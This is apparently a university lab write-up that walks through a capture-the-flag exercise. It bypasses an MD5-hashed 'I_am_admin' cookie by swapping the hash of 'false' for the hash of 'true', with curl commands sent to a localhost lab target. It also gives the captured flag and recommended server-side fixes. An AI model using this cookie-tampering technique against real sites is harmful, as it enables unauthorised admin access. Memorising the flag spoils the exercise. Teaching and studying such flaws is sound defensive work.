# Cookie Authentication Vulnerability - Web Security Lab

## 🎯 Objective
Exploit a weak cookie-based authentication mechanism to gain admin access through MD5 hash manipulation.

## 🔍 Vulnerability Description

The web application uses an insecure cookie named `I_am_admin` with an MD5-hashed value to determine administrative privileges. This implementation has critical security flaws:

- **Weak hashing algorithm**: MD5 is cryptographically broken and easily reversible
- **Client-side authentication**: Trusting cookies for sensitive operations
- **Predictable values**: Boolean values ("true"/"false") are trivial to brute-force

## 🛠️ Exploitation Steps

### Step 1: Cookie Analysis

Inspect the browser cookies and locate the `I_am_admin` field:
```
I_am_admin=68934a3e9455fa72420237eb05902327
```

### Step 2: MD5 Decryption

Decrypt the MD5 hash using online tools like [md5decrypt.net](https://md5decrypt.net):
```
68934a3e9455fa72420237eb05902327 → "false"
```

### Step 3: Generate Admin Hash

Create the MD5 hash for the value "true":
```bash
echo -n "true" | md5sum
# Output: b326b5062b2f0e69046810717534cb09
```

### Step 4: Exploit with cURL

Send a request with the modified cookie:

```bash
curl -v \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-GB,en;q=0.5" \
  -H "Connection: keep-alive" \
  -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
  "http://localhost:8080/?page=recover"
```

**Alternative (simplified)**:
```bash
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
  "http://localhost:8080/?page=recover"
```

### Step 5: Success!

The server responds with:
```
Good job! Flag: df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## 🚨 Security Issues Identified

1. **Client-side authentication**: Never trust client-supplied data for authorization decisions
2. **Weak cryptographic algorithm**: MD5 is vulnerable to collisions and rainbow table attacks
3. **Predictable values**: Using simple boolean strings makes the system trivial to exploit
4. **No integrity verification**: No HMAC or signature to prevent cookie tampering

## 🛡️ Recommended Patches

### 1. Server-Side Session Management

# BAD - Cookie-based auth
if request.cookies.get('I_am_admin') == md5('true'):
    grant_admin_access()

# GOOD - Server-side sessions
if session.get('user_role') == 'admin':
    grant_admin_access()
```



## 📚 Learning Resources

- [OWASP - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [OWASP - Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [Why MD5 is broken](https://www.kb.cert.org/vuls/id/836068)

## ⚠️ Disclaimer

This repository is for **educational purposes only** as part of a university web security course. Only test on authorized systems within controlled lab environments.

## 📝 Lab Information

- **Course**: Web Security
- **Exercise**: Cookie-Based Authentication Bypass
- **Difficulty**: Beginner
- **Target**: http://localhost:8080

---

**Flag**: `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`